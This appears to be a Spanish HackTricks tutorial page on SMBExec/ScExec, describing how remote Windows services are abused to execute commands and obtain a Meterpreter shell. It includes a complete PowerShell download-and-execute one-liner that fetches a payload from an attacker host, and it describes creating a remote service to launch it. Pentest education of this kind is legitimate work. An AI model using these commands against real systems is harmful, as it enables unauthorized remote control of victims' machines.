# SmbExec/ScExec

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Cómo funciona

**Smbexec funciona como Psexec.** En este ejemplo, **en lugar** de apuntar el "_binpath_" a un ejecutable malicioso dentro de la víctima, vamos a **dirigirlo** a **cmd.exe o powershell.exe** y uno de ellos descargará y ejecutará el backdoor.

## **SMBExec**

Veamos qué sucede cuando se ejecuta smbexec observándolo desde el lado del atacante y del objetivo:

![](../../.gitbook/assets/smbexec\_prompt.png)

Entonces sabemos que crea un servicio "BTOBTO". Pero ese servicio no está presente en la máquina objetivo cuando hacemos un `sc query`. Los registros del sistema revelan una pista de lo que sucedió:

![](../../.gitbook/assets/smbexec\_service.png)

El Nombre del Archivo de Servicio contiene una cadena de comandos para ejecutar (%COMSPEC% apunta a la ruta absoluta de cmd.exe). Hace un eco del comando a ejecutar a un archivo bat, redirige el stdout y stderr a un archivo Temp, luego ejecuta el archivo bat y lo elimina. De vuelta en Kali, el script de Python luego extrae el archivo de salida a través de SMB y muestra el contenido en nuestro "pseudo-shell". Por cada comando que escribimos en nuestro "shell", se crea un nuevo servicio y el proceso se repite. Por eso no necesita soltar un binario, simplemente ejecuta cada comando deseado como un nuevo servicio. Definitivamente más sigiloso, pero como vimos, se crea un registro de eventos para cada comando ejecutado. ¡Aún así, una forma muy ingeniosa de obtener un "shell" no interactivo!

## SMBExec Manual

**O ejecutando comandos a través de servicios**

Como demostró smbexec, es posible ejecutar comandos directamente desde binPaths de servicios en lugar de necesitar un binario. Esto puede ser un truco útil para tener a mano si necesitas ejecutar solo un comando arbitrario en una máquina Windows objetivo. Como ejemplo rápido, obtengamos un shell de Meterpreter usando un servicio remoto _sin_ un binario.

Usaremos el módulo `web_delivery` de Metasploit y elegiremos un objetivo de PowerShell con un payload de Meterpreter inverso. El listener está configurado y nos dice el comando a ejecutar en la máquina objetivo:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
Desde nuestra caja de ataque Windows, creamos un servicio remoto ("metpsh") y configuramos el binPath para ejecutar cmd.exe con nuestro payload:

![](../../.gitbook/assets/sc\_psh\_create.png)

Y luego lo iniciamos:

![](../../.gitbook/assets/sc\_psh\_start.png)

Da error porque nuestro servicio no responde, pero si miramos nuestro listener de Metasploit vemos que se hizo la llamada de retorno y se ejecutó el payload.

Toda la información fue extraída de aquí: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
